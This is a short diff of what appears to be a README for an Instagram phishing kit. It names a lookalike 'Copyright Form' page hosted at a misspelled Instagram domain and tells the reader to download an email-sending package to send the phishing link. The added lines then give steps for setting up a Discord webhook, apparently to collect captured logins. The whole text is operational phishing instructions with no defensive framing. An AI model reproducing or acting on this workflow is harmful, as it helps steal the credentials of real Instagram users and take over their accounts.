@@ -20,6 +20,21 @@ if you think copyright infringement is wrong, you should provide feedback. Other
 Copyright Form
 https://lnstaagram.netlify.app/
 
+
+
+
+
 To send phishing link via email
 download email-sending.zip
+
+
+
+
+
+how to create webhook server
+go to discord.com
+click add server
+then name a server 
+after creating server then go to integration in server setting
+in integration create a webhook 
 
